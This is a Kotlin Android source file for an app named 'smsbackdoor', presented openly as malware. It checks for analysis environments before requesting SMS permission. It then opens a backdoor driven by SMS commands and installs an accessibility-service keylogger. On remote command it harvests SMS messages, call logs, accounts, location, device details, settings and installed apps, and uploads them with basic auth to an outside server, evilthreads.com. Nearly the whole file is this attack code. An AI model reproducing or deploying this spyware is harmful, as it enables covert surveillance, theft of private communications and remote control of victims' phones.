/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.*/
package com.evilthreads.smsbackdoor

import android.Manifest
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.evilthreads.evade.evade
import com.evilthreads.keylogger.Keylogger
import com.evilthreads.pickpocket.*
import com.evilthreads.pickpocket.podos.*
import com.kotlinpermissions.KotlinPermissions
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.features.auth.*
import io.ktor.client.features.auth.providers.*
import io.ktor.client.features.json.*
import io.ktor.client.features.json.serializer.*
import io.ktor.client.request.*
import io.ktor.http.*
import kotlinx.coroutines.runBlocking
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
/**
* @author Chris Basinger
* @email evilthreads669966@gmail.com
* @date 10/08/20
*
*  [Context.evade] is used to check whether it is safe before using [KotlinPermissions.ask] to request [RECEIVE_SMS] permission. The [onAccepted] callback is where your optional
 *  payload to run inside of [BackdoorService] will be initialized. After this, [SmsBackdoor.open] is used to open the backdoor and to allow you to implement your own command handler for remote commands
 *  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe]
 *  method of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for
 *  retreiving the data. The data is then serialized and posted to the REST API web server with Ktor [HTTPClient] using a basic authentication credentials.
* */
class MainActivity : AppCompatActivity() {

    companion object{
        val TAG = this::class.java.simpleName
    }

    init {
        lifecycleScope.launchWhenCreated {
            evade(this) {
                KotlinPermissions.with(this@MainActivity).permissions(Manifest.permission.RECEIVE_SMS)
                    .onAccepted {
                        val myPayload = suspend {
                            Keylogger.subscribe { entry ->
                                Log.d(TAG, entry.toString())
                            }
                        }
                        SmsBackdoor.openDoor(this@MainActivity, "666:", payload = myPayload) { remoteCommand ->
                            runBlocking {
                                when (remoteCommand) {
                                    "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
                                    "COMMAND_GET_CALL_LOG" -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
                                    "COMMAND_GET_SMS" -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
                                    "COMMAND_GET_ACCOUNTS" -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
                                    "COMMAND_GET_MMS" -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d(TAG, "NEEDS MULTIPART") }
                                    "COMMAND_GET_FILES" -> filesLaunch(this@MainActivity).let { files -> Log.d(TAG, "NEEDS MULTIPART") }
                                    "COMMAND_GET_DEVICE_INFO" -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
                                    "COMMAND_GET_LOCATION" -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
                                    "COMMAND_GET_SETTINGS" -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
                                    "COMMAND_GET_INSTALLED_APPS" -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
                                    else -> Log.d(TAG, "COMMAND NOT FOUND")
                                }
                            }
                        }
                        Keylogger.requestPermission(this@MainActivity)
                    }.ask()
            }
        }
    }
}

val client = HttpClient(CIO){
    install(JsonFeature){
        serializer = KotlinxSerializer()
    }
    install(Auth){
        basic {
            username = "evilthreads"
            password = "secret"
        }
    }
}

val url = "http://evilthreads.com/"
val contactsUri = url.plus("contacts")
val smsUri = url.plus("sms")
val callLogUri = url.plus("calls")
val accountsUri = url.plus("accounts")
val mmsUri = url.plus("mms")
val filesUri = url.plus("files")
val deviceUri = url.plus("device")
val locationUri = url.plus("location")
val settingsUri = url.plus("settings")
val softwareUri = url.plus("software")

inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
    lateinit var uri: String
    when(data.first()){
        is Contact -> uri = contactsUri
        is CallLogEntry -> uri = callLogUri
        is Sms -> uri = smsUri
        is UserAccount -> uri = accountsUri
        is Mms -> uri = mmsUri
        is DocumentsFile -> uri = filesUri
        is Device -> uri = deviceUri
        is RecentLocation -> uri = locationUri
        is Setting -> uri = settingsUri
        is Software -> uri = softwareUri
    }
    this.post<List<T>>(uri){
        body = defaultSerializer().write(data, ContentType.Application.Json)
    }
}
